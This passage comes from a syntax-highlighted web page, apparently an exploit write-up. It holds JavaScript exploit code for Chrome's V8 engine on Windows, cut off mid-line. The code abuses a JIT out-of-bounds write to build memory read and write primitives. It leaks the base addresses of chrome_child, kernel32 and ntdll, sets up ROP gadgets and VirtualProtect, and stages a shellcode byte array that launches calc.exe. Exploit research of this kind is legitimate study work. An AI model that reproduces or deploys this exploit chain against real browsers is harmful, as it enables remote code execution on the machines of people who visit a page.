class="line"><span class="javascript">                    <span class="built_in">arguments</span>[i] = <span class="keyword">new</span> Int64(<span class="built_in">arguments</span>[i]);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> f.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// this = -n (two's complement)</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.assignNeg = operation(<span class="function"><span class="keyword">function</span> <span class="title">neg</span><span class="params">(n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span></span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, Int64.One);</span></span><br><span class="line">    &#125;, 1);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// this = a + b</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.assignAdd = operation(<span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;</span></span><br><span class="line">            carry = cur &gt; 0xff | 0;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// this = a - b</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.assignSub = operation(<span class="function"><span class="keyword">function</span> <span class="title">sub</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;</span></span><br><span class="line">            carry = cur &lt; 0 | 0;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// this = a &amp; b</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.assignAnd = operation(<span class="function"><span class="keyword">function</span> <span class="title">and</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line">            bytes[i] = a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line">    &#125;, 2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span></span></span><br><span class="line"><span class="actionscript">Int64.fromDouble = <span class="function"><span class="keyword">function</span><span class="params">(d)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> bytes = Struct.pack(Struct.float64, d);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> <span class="keyword">new</span> Int64(bytes);</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Convenience functions. These allocate a new Int64 to hold the result.</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return -n (two's complement)</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Neg</span><span class="params">(n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignNeg(n);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return a + b</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Add</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAdd(a, b);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return a - b</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignSub(a, b);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return a &amp; b</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">And</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAnd(a, b);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">hex</span><span class="params">(a)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (a == <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">"0xUNDEFINED"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> ret = a.toString(<span class="number">16</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (ret.substr(<span class="number">0</span>,<span class="number">2</span>) != <span class="string">"0x"</span>) <span class="keyword">return</span> <span class="string">"0x"</span>+ret;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span> <span class="keyword">return</span> ret;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">lower</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// returns the lower 32bit of double x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">upper</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// returns the upper 32bit of double x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">lowerint</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// returns the lower 32bit of int x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">upperint</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// returns the upper 32bit of int x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">combine</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">//console.log(a.toString());</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">//console.log(b.toString());</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), <span class="number">16</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">//padLeft用于字符串左补位</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">combineint</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(b.toString(<span class="number">16</span>).substr(<span class="number">-8</span>,<span class="number">8</span>) + (a.toString(<span class="number">16</span>)).padLeft(<span class="number">8</span>), <span class="number">16</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">gc</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> <span class="built_in">String</span>();</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">clear_space</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">  gc();</span><br><span class="line">  gc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> <span class="number">1</span> + <span class="number">1</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> leak = get_shell;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">fun</span><span class="params">(arg)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span></span><br><span class="line"><span class="javascript">    a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span></span><br><span class="line">    a1[0] = 1.1;</span><br><span class="line"><span class="javascript">    oob_double_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span></span><br><span class="line">    oob_double_Array[0] = 1.1;</span><br><span class="line"><span class="javascript">    object_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span></span><br><span class="line">    object_Array[0] = &#123;&#125;;</span><br><span class="line">    object_Array[1] = leak;</span><br><span class="line">    x = x &gt;&gt; 16</span><br><span class="line"><span class="actionscript">    a1[x * <span class="number">19</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0xffff00000000</span></span></span><br><span class="line"><span class="actionscript">    a1[x * <span class="number">21</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x2a00000000</span></span></span><br><span class="line"><span class="actionscript">    a1[x * <span class="number">41</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x2a00000000</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a1, oob_double_Array, object_Array, oob_buffer;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a3 = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span></span><br><span class="line">a3.length = 0x11000;</span><br><span class="line">a3.fill(3.3);</span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a4 = [<span class="number">1.1</span>];</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) fun(...a4);</span></span><br><span class="line"><span class="actionscript"><span class="comment">// %OptimizeFunctionOnNextCall(fun);</span></span></span><br><span class="line">fun(...a3);</span><br><span class="line"><span class="actionscript"><span class="comment">// console.log(a1.length);</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// console.log(oob_double_Array.length);</span></span></span><br><span class="line">/* for (var i = 0; i &lt; a1.length; i++)&#123;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a1[i]);</span></span><br><span class="line">&#125;  */</span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"this is a2"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">user_space_read</span><span class="params">(leak)</span></span>&#123;</span></span><br><span class="line">  object_Array[1] = leak;</span><br><span class="line"><span class="actionscript">  <span class="keyword">return</span> oob_double_Array[<span class="number">23</span>];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">writePtr</span><span class="params">(offset, address, value)</span></span>&#123;</span></span><br><span class="line">  oob_double_Array[offset] = address;</span><br><span class="line"><span class="javascript">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span></span><br><span class="line">  fake_dv[0] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">readPtr</span><span class="params">(offset, address)</span></span>&#123;</span></span><br><span class="line">  oob_double_Array[offset] = address;</span><br><span class="line"><span class="javascript">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">return</span> fake_dv[<span class="number">0</span>];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function_addr = oob_double_Array[23];</span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"[+] the get shell function addr is at "</span> + Int64.fromDouble(function_addr).toString());</span></span><br><span class="line"><span class="javascript">oob_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span></span><br><span class="line"></span><br><span class="line">%DebugPrint(get_shell);</span><br><span class="line">/* for (var i = 0; i &lt; oob_double_Array.length; i++)&#123;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(Int64.fromDouble(oob_double_Array[i]).toString());</span></span><br><span class="line">&#125; */</span><br><span class="line">%DebugPrint(a1);</span><br><span class="line">%DebugPrint(oob_double_Array);</span><br><span class="line">%DebugPrint(oob_buffer);</span><br><span class="line"></span><br><span class="line">oob_buffer_addr = user_space_read(oob_buffer);</span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the oob_buffer_addr is at " + Int64.fromDouble(oob_buffer_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line">oob_array_addr = user_space_read(oob_double_Array);</span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the oob_array_addr is at " + Int64.fromDouble(oob_array_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">temp1 = Int64.fromDouble(oob_buffer_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble() - oob_array_addr + <span class="keyword">new</span> Int64(<span class="number">0x81</span>).asDouble());</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("temp1 is " + temp1.toString())</span></span></span><br><span class="line"></span><br><span class="line">offset = lowerint(temp1) / 8;</span><br><span class="line"><span class="actionscript"><span class="comment">// alert("offset is " + offset.toString())</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* object_Array[1] = oob_double_Array;</span><br><span class="line">oob_double_Array_addr = oob_double_Array[23];</span><br><span class="line"><span class="actionscript">alert(<span class="string">"[+] the oob_double_Array_addr is at "</span> + Int64.fromDouble(oob_double_Array_addr).toString());</span></span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch_u8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(scratch);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch_u64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(scratch);</span></span><br><span class="line">scratch_u8.fill(0x41, 0, 10);</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> shellcode1 = [<span class="number">72</span>, <span class="number">131</span>, <span class="number">236</span>, <span class="number">40</span>, <span class="number">72</span>, <span class="number">131</span>, <span class="number">228</span>, <span class="number">240</span>, <span class="number">72</span>, <span class="number">199</span>, <span class="number">194</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">76</span>, <span class="number">139</span>, <span class="number">34</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">32</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">36</span>, <span class="number">36</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">36</span>, <span class="number">36</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">186</span>, <span class="number">142</span>, <span class="number">78</span>, <span class="number">14</span>, <span class="number">236</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">139</span>, <span class="number">204</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">235</span>, <span class="number">56</span>, <span class="number">89</span>, <span class="number">255</span>, <span class="number">208</span>, <span class="number">72</span>, <span class="number">199</span>, <span class="number">194</span>, <span class="number">152</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">14</span>, <span class="number">73</span>, <span class="number">139</span>, <span class="number">204</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">216</span>, <span class="number">77</span>, <span class="number">51</span>, <span class="number">201</span>, <span class="number">235</span>, <span class="number">60</span>, <span class="number">65</span>, <span class="number">88</span>, <span class="number">235</span>, <span class="number">42</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">202</span>, <span class="number">255</span>, <span class="number">211</span>, <span class="number">72</span>, <span class="number">199</span>, <span class="number">194</span>, <span class="number">197</span>, <span class="number">181</span>, <span class="number">73</span>, <span class="number">17</span>, <span class="number">73</span>, <span class="number">139</span>, <span class="number">204</span>, <span class="number">232</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">208</span>, <span class="number">232</span>, <span class="number">195</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">46</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">232</span>, <span class="number">209</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">99</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">232</span>, <span class="number">191</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">99</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">139</span>, <span class="number">233</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">60</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">221</span>, <span class="number">76</span>, <span class="number">3</span>, <span class="number">232</span>, <span class="number">69</span>, <span class="number">139</span>, <span class="number">181</span>, <span class="number">136</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">3</span>, <span class="number">243</span>, <span class="number">69</span>, <span class="number">139</span>, <span class="number">86</span>, <span class="number">24</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">94</span>, <span class="number">32</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">219</span>, <span class="number">103</span>, <span class="number">227</span>, <span class="number">60</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">202</span>, <span class="number">66</span>, <span class="number">139</span>, <span class="number">52</span>, <span class="number">147</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">255</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">192</span>, <span class="number">252</span>, <span class="number">172</span>, <span class="number">132</span>, <span class="number">192</span>, <span class="number">116</span>, <span class="number">7</span>, <span class="number">193</span>, <span class="number">207</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">248</span>, <span class="number">235</span>, <span class="number">244</span>, <span class="number">59</span>, <span class="number">250</span>, <span class="number">117</span>, <span class="number">220</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">94</span>, <span class="number">36</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">219</span>, <span class="number">51</span>, <span class="number">201</span>, <span class="number">102</span>, <span class="number">66</span>, <span class="number">139</span>, <span class="number">12</span>, <span class="number">83</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">94</span>, <span class="number">28</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">219</span>, <span class="number">139</span>, <span class="number">4</span>, <span class="number">139</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">195</span>, <span class="number">195</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(shellcode1.length);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode1.length; i++)&#123;</span></span><br><span class="line">  shellcode[i] = shellcode1[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> div_addr = user_space_read(div);</span></span><br><span class="line"><span class="actionscript">alert(<span class="string">"[+] the div_addr is at "</span> + Int64.fromDouble(div_addr).toString());</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">el_addr = readPtr(offset, div_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the el_addr is at " + Int64.fromDouble(el_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line">el_vftable = readPtr(offset, el_addr);</span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the leak is at " + Int64.fromDouble(leak).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">chrome_child_addr = el_vftable - (<span class="keyword">new</span> Int64(<span class="number">0x433e910</span>).asDouble());</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the chrome_child_addr is at " + Int64.fromDouble(chrome_child_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// kernel32_addr = readPtr(offset, chrome_child_addr + new Int64(0x49dbde8).asDouble()) - new Int64(0x20db0).asDouble();</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// x chrome_child!*CreateEventW*</span></span></span><br><span class="line"><span class="actionscript">kernel32_addr = readPtr(offset, chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x49db4f8</span>).asDouble()) - <span class="keyword">new</span> Int64(<span class="number">0x21f20</span>).asDouble();</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the kernel32_addr is at " + Int64.fromDouble(kernel32_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// ntdll_addr = readPtr(offset, kernel32_addr + new Int64(0x79208).asDouble()) - new Int64(0x9a9b0).asDouble();</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// 0:016&gt; x KERNEL32!*NtQueryEvent*</span></span></span><br><span class="line"><span class="actionscript">ntdll_addr = readPtr(offset, kernel32_addr + <span class="keyword">new</span> Int64(<span class="number">0x76fe8</span>).asDouble()) - <span class="keyword">new</span> Int64(<span class="number">0xa55d0</span>).asDouble();;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the ntdll_addr is at " + Int64.fromDouble(ntdll_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// gadget = ntdll_addr + new Int64(0xA0715).asDouble();</span></span></span><br><span class="line"><span class="actionscript">gadget = ntdll_addr + <span class="keyword">new</span> Int64(<span class="number">0xAB9B5</span>).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the gadget(mov     rdx, [rcx+50h]\n mov     rbp, [rcx+18h]\n mov     rsp, [rcx+10h]\n) is at " + Int64.fromDouble(gadget).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">pop_rcx_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x40982c</span>).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the pop_rcx_ret is at " + Int64.fromDouble(pop_rcx_ret).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">pop_rdx_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x12d91a</span>).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the pop_rdx_ret is at " + Int64.fromDouble(pop_rdx_ret).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">pop_r8_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x11b6012</span>).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the pop_r8_ret is at " + Int64.fromDouble(pop_r8_ret).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">pop_r9_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x197b44c</span>).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the pop_r9_ret is at " + Int64.fromDouble(pop_r9_ret).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// virtaulprotect_addr = kernel32_addr + new Int64(0x193d0).asDouble();</span></span></span><br><span class="line"> </span><br><span class="line"><span class="actionscript">virtaulprotect_addr = kernel32_addr + <span class="keyword">new</span> Int64(<span class="number">0x1B330</span>).asDouble();</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the virtaulprotect_addr is at " + Int64.fromDouble(virtaulprotect_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line">%DebugPrint(scratch);</span><br><span class="line"></span><br><span class="line">scratch_buffer_addr = user_space_read(scratch);</span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the scratch_buffer_addr is at " + Int64.fromDouble(scratch_buffer_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch_addr = readPtr(offset, scratch_buffer_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the scratch_addr is at " + Int64.fromDouble(scratch_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line">sc_upper = upper(scratch_addr);</span><br><span class="line">sc_lower = lower(scratch_addr);</span><br><span class="line">scratch_addr1 = combineint(sc_upper, sc_lower);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> sc_offset = <span class="number">0x20000</span> - scratch_addr1 % <span 